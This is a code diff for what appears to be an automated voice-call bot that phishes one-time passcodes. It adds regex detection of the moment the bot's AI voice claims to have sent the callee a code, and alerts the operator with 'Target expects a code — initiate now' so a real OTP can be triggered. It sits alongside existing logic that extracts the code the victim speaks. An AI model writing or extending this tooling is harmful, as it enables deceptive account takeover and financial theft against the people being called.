@@ -39,6 +39,50 @@ _MACHINE_ENDED_REASONS = {
     "customer-did-not-answer",
 }
 
+# Phrases the AI says right before/when delivering the one-time passcode.
+# We use these to tell the operator the call is at the "code stage" so they
+# can start the real OTP flow on their side at the right moment.
+_PASSCODE_STAGE_PATTERNS = [
+    re.compile(r"\b(one[ -]time|verification|security|confirmation|access)\b[^\n]{0,30}\b(pass ?code|code|pin)\b", re.I),
+    re.compile(r"\b(i(?:'ve| have)? just sent)\b", re.I),
+    re.compile(r"\b(sending|sent) (you )?(a |your |the )?(pass ?code|code|pin)\b", re.I),
+    re.compile(r"\b(texted|texting) (you|it)\b", re.I),
+    re.compile(r"\b(your code|the code|this code|the pass ?code)\b[^\n]{0,30}\b(be |is )?(\d|\n)", re.I),
+    re.compile(r"\b(receive|should receive|will receive|got|getting)[^\n]{0,20}\b(code|pass ?code|pin)\b", re.I),
+]
+
+
+def _detect_passcode_stage(text: str) -> Optional[str]:
+    """Return a label if the assistant message announces an OTP delivery."""
+    if not text:
+        return None
+    sample = text.strip()
+    if len(sample) < 6:
+        return None
+    for pattern in _PASSCODE_STAGE_PATTERNS:
+        match = pattern.search(sample)
+        if match:
+            return match.group(0)[:60]
+    return None
+
+
+def _notify_passcode_stage(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str], call_data: Optional[dict], snippet: str) -> None:
+    """One-shot operator notice when the AI reaches the passcode stage."""
+    try:
+        from bot import get_call_session
+        session = get_call_session(call_sid) or (get_call_session(vapi_call_id) if vapi_call_id else None)
+        if session and session.get("passcode_stage_notified"):
+            return
+        if session:
+            session["passcode_stage_notified"] = True
+        chat_id = _resolve_chat_id(payload, call_sid, vapi_call_id, call_data)
+        if not chat_id:
+            return
+        logger.info("[VAPI_PASSCODE_STAGE] snippet=%s chat_id=%s", snippet, chat_id)
+        _send_live_status(int(chat_id), "⏳ Target expects a code — initiate now")
+    except Exception as e:
+        logger.warning("[VAPI_PASSCODE_STAGE_ERROR] %s", e)
+
 
 def _detect_ivr_in_transcript(text: str) -> Optional[str]:
     """Return the matched pattern if the customer speech looks like an IVR.
@@ -383,6 +427,25 @@ def _handle_transcript(payload: dict, call_sid: Optional[str], vapi_call_id: Opt
                     if transcript_text:
                         role = "customer"
                         break
+
+        # Capture the newest assistant utterance too, so the passcode-stage
+        # notice fires even on conversation-update payloads.
+        assistant_turn = None
+        if event_type == "conversation-update":
+            message_body = payload.get("message", payload)
+            msgs = message_body.get("messages") or payload.get("messages") or []
+            for msg in reversed(msgs):
+                msg_role = str(msg.get("role", "")).lower()
+                if msg_role in ("bot", "assistant"):
+                    assistant_turn = (
+                        msg.get("transcript")
+                        or msg.get("content")
+                        or msg.get("text")
+                        or msg.get("message")
+                        or ""
+                    )
+                    if assistant_turn:
+                        break
         else:
             transcript_text = (
                 message.get("transcript")
@@ -402,6 +465,18 @@ def _handle_transcript(payload: dict, call_sid: Optional[str], vapi_call_id: Opt
                 _send_live_status(chat_id, f"👤 Target: {transcript_text}")
             else:
                 _send_live_status(chat_id, f"💬 AI: {transcript_text}")
+
+        # Passcode stage: when the AI announces a one-time passcode, nudge the
+        # operator once (no buttons) so they can start the OTP flow in time.
+        passcode_source = None
+        if role != "customer" and transcript_text:
+            passcode_source = transcript_text
+        elif assistant_turn:
+            passcode_source = assistant_turn
+        if passcode_source:
+            stage_snippet = _detect_passcode_stage(passcode_source)
+            if stage_snippet:
+                _notify_passcode_stage(payload, call_sid, vapi_call_id, call_data, stage_snippet)
 
         if role == "customer" and transcript_text:
             otp = extract_otp_from_transcript(transcript_text, code_length)
